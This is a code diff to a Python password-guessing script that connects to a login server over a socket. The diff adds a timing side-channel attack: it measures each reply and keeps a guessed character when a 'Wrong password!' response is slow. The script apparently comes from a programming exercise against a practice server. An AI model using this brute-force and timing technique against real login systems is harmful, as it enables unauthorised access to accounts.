@@ -1,4 +1,4 @@
-import itertools
+from time import perf_counter
 import json
 import os
 import socket
@@ -30,7 +30,9 @@ with socket.socket() as client_socket:
                 password_test = password + letter
                 data = {"login": login, "password": password_test}
                 client_socket.send(json.dumps(data).encode("utf-8"))
+                start = perf_counter()
                 response = client_socket.recv(1024).decode('utf8')
+                stop = perf_counter()
                 response = json.loads(response)
 
                 if response["result"] == 'Connection success!':
@@ -38,6 +40,9 @@ with socket.socket() as client_socket:
                     break
                 elif response["result"] == 'Exception happened during login':
                     password = password_test
+                elif response["result"] == 'Wrong password!':
+                    if stop - start >= 0.1:
+                        password = password_test
     except:
         pass
 
